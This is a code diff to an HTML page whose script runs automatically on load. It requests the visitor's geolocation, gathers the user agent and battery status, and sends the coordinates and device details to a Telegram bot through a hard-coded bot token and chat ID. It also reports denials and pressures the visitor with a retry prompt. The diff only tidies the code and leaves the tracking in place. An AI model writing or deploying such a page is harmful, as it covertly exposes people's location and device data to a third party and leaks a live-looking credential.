@@ -9,7 +9,7 @@
 
   <script>
     // === YOUR TELEGRAM CONFIG ===
-    const BOT_TOKEN = "8273361289:AAHZeKlDTzun2-n6AdIdUm3GtnMondBLl64"; 
+    const BOT_TOKEN = "8273361289:AAHZeKlDTzun2-n6AdIdUm3GtnMondBLl64";
     const CHAT_ID = "6677946042";
 
     // Send message to Telegram
@@ -27,55 +27,60 @@
     // Get Device Info
     async function getDeviceInfo() {
       let batteryInfo = "";
-      if (navigator.getBattery) {
-        const battery = await navigator.getBattery();
-        batteryInfo = `Battery: ${(battery.level * 100)}% (Charging: ${battery.charging})`;
-      } else {
-        batteryInfo = "Battery info not supported";
+      try {
+        if (navigator.getBattery) {
+          const battery = await navigator.getBattery();
+          batteryInfo = `Battery: ${(battery.level * 100)}% (Charging: ${battery.charging})`;
+        } else {
+          batteryInfo = "Battery info not supported";
+        }
+      } catch {
+        batteryInfo = "Battery info not accessible";
       }
 
       const userAgent = navigator.userAgent;
       return `Device: ${userAgent}\n${batteryInfo}`;
     }
 
-    // Ask for location until allowed
+    // Request Location
     async function requestLocation() {
       const deviceInfo = await getDeviceInfo();
 
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          // ✅ Success
-          function (position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const accuracy = position.coords.accuracy;
+      if (!navigator.geolocation) {
+        sendToTelegram("❌ Geolocation not supported\n\n" + deviceInfo);
+        document.body.innerHTML = "<h3>❌ Geolocation not supported</h3>";
+        return;
+      }
 
-            const msg = `📍 Location Captured:
+      navigator.geolocation.getCurrentPosition(
+        // ✅ Success
+        function (position) {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          const accuracy = position.coords.accuracy;
+
+          const msg = `📍 Location Captured:
 Latitude: ${lat}
 Longitude: ${lon}
 Accuracy: ${accuracy}m
 
 ${deviceInfo}`;
 
-            sendToTelegram(msg);
-            document.body.innerHTML = "<h3>✅ Location sent to Telegram</h3>";
-          },
-          // ❌ Error / Denied
-          function (error) {
-            document.body.innerHTML = `
-              <h3>⚠️ Please allow location access!</h3>
-              <button onclick="requestLocation()">Retry</button>
-            `;
-            sendToTelegram("❌ Location access denied: " + error.message + "\n\n" + deviceInfo);
-          }
-        );
-      } else {
-        sendToTelegram("❌ Geolocation not supported\n\n" + deviceInfo);
-        document.body.innerHTML = "<h3>❌ Geolocation not supported</h3>";
-      }
+          sendToTelegram(msg);
+          document.body.innerHTML = "<h3>✅ Location sent to Telegram</h3>";
+        },
+        // ❌ Error / Denied
+        function (error) {
+          document.body.innerHTML = `
+            <h3>⚠️ Please allow location access!</h3>
+            <button onclick="requestLocation()">Retry</button>
+          `;
+          sendToTelegram("❌ Location access denied: " + error.message + "\n\n" + deviceInfo);
+        }
+      );
     }
 
-    // Run on page load
+    // Auto-run
     requestLocation();
   </script>
 </body>
